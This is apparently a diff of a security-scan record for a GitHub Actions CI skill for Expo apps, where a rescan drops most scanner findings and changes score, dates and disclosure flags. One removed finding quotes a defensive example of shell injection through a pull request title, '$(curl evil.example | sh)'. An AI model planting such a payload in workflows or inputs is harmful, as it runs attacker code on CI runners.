@@ -4,8 +4,8 @@
   "repo": "ReactNative-Skills",
   "path": "skills/ci-pipeline-and-gates",
   "name": "ci-pipeline-and-gates",
-  "description": "Builds GitHub Actions CI for Expo apps - verify on every PR, SHA-pinned actions, pinned runners and Node, device lanes, manual EAS releases. Use when editing .github/workflows or CI fails. Not for local gates (quality-gates).",
-  "stars": 12,
+  "description": "",
+  "stars": 13,
   "category": "coding",
   "commit": "41a0e66d4d09de5b46e6537f59a97c7192473486",
   "contentHash": "68886eef7c83b47b275b75ffa8ecde84f6b8d128f056f22ec529e604f06d8692",
@@ -13,71 +13,9 @@
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": true,
-  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scannedAt": "2026-11-13T10:10:34.466Z",
   "scan": {
     "findings": [
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/SKILL.md",
-        "line": 20,
-        "excerpt": "or the two steps). No hand-written lint, test or build steps, no `npx jest` beside it,",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/SKILL.md",
-        "line": 144,
-        "excerpt": "- **`run: npx eslint . && npx tsc && npx jest` in the workflow.** It drifts from `verify` the day a",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/SKILL.md",
-        "line": 161,
-        "excerpt": "- **`expo/expo-github-action` with `eas-version: latest`, or `npx eas-cli build` on every push to",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/checks.md",
-        "line": 73,
-        "excerpt": "| `eas-cli-pinned` | `npx eas-cli` / `npx eas`; `expo/expo-github-action` with an `eas-version` that is not `x.y.z` | an unpinned CLI changes behaviour between ",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/checks.md",
-        "line": 152,
-        "excerpt": "from a pinned release binary checked against the release's checksums file (no `go install`, no",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/ci-pipeline-and-gates/references/checks.md",
-        "line": 156,
-        "excerpt": "V=1.7.12; curl -fsSLO https://github.com/rhysd/actionlint/releases/download/v$V/actionlint_${V}_darwin_arm64.tar.gz",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": [
-          "github.com"
-        ]
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/ci-pipeline-and-gates/references/checks.md",
-        "line": 157,
-        "excerpt": "curl -fsSLO https://github.com/rhysd/actionlint/releases/download/v$V/actionlint_${V}_checksums.txt",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": [
-          "github.com"
-        ]
-      },
       {
         "ruleId": "writes-outside",
         "file": "skills/ci-pipeline-and-gates/references/device-lanes.md",
@@ -91,7 +29,7 @@
         "file": "skills/ci-pipeline-and-gates/references/device-lanes.md",
         "line": 164,
         "excerpt": "curl -s https://raw.githubusercontent.com/actions/runner-images/main/images/ubuntu/Ubuntu2404-Readme.md | grep -A12 '^### Android'",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false,
         "hosts": [
           "raw.githubusercontent.com"
@@ -102,7 +40,7 @@
         "file": "skills/ci-pipeline-and-gates/references/device-lanes.md",
         "line": 165,
         "excerpt": "curl -s https://raw.githubusercontent.com/ReactiveCircus/android-emulator-runner/main/README.md | grep -A6 'Enable KVM'",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false,
         "hosts": [
           "raw.githubusercontent.com"
@@ -110,96 +48,39 @@
       },
       {
         "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/release-lane.md",
-        "line": 57,
-        "excerpt": "- run: npm install -g --min-release-age=7 --ignore-scripts eas-cli@24.10.0",
+        "file": "skills/ci-pipeline-and-gates/scripts/check-ci-lanes.mjs",
+        "line": 62,
+        "excerpt": "'  eas-cli-pinned       npx eas-cli, or expo/expo-github-action without an exact eas-version',",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/release-lane.md",
-        "line": 66,
-        "excerpt": "line: `npx eas-cli` inside the repo stops with `ESTRICTALLOWSCRIPTS` (the repo's",
+        "file": "skills/ci-pipeline-and-gates/scripts/check-ci-lanes.mjs",
+        "line": 117,
+        "excerpt": "report.problem({ file: rel, line: command.line, rule: 'install-ci', message: `global install \"${command.text}\" skips the repo's dependency policy`, fix: 'Instal",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/security-hardening.md",
-        "line": 89,
-        "excerpt": "- npm is deliberately absent: Expo SDK packages move together through `npx expo install`",
+        "file": "skills/ci-pipeline-and-gates/scripts/check-ci-lanes.mjs",
+        "line": 238,
+        "excerpt": "if (eas.npx) report.problem({ file: rel, line: command.line, rule: 'eas-cli-pinned', message: 'npx eas-cli resolves whatever version is newest and is stopped by",
         "disclosed": false,
         "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/security-hardening.md",
-        "line": 127,
-        "excerpt": "pull request title or a workflow input such as `$(curl evil.example | sh)` then runs as code; a",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/ci-pipeline-and-gates/references/security-hardening.md",
-        "line": 218,
-        "excerpt": "curl -s https://api.github.com/repos/actions/checkout/releases?per_page=3 | grep -E '\"(tag_name|published_at)\"'",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": [
-          "api.github.com"
-        ]
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/workflow-anatomy.md",
-        "line": 140,
-        "excerpt": "| EAS CLI 24.10.0 | the release workflow | `npm install -g --min-release-age=7 --ignore-scripts eas-cli@24.10.0` |",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/ci-pipeline-and-gates/references/workflow-anatomy.md",
-        "line": 227,
-        "excerpt": "4. Replace an existing workflow's ad-hoc steps (`npx jest`, `npx eslint .`, `expo export`) with the",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/ci-pipeline-and-gates/references/workflow-anatomy.md",
-        "line": 259,
-        "excerpt": "curl -s https://raw.githubusercontent.com/actions/runner-images/main/images/macos/macos-26-arm64-Readme.md | grep -A10 '^### Xcode'",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": [
-          "raw.githubusercontent.com"
-        ]
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/ci-pipeline-and-gates/references/workflow-anatomy.md",
-        "line": 260,
-        "excerpt": "curl -s https://raw.githubusercontent.com/actions/runner-images/main/images/ubuntu/Ubuntu2404-Readme.md | grep -A12 '^### Android'",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": [
-          "raw.githubusercontent.com"
-        ]
       }
     ],
     "findingTotals": {
-      "downloads-code": 11,
-      "network": 7,
-      "writes-outside": 1
+      "writes-outside": 1,
+      "network": 2,
+      "downloads-code": 3
     },
-    "score": 72,
+    "score": 70,
     "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 8,
-    "filesSkipped": 22
+    "filesScanned": 6,
+    "filesSkipped": 24
   },
   "history": [
     {
